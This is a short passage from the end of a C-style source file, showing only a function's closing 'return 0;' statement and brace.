    return 0;
}
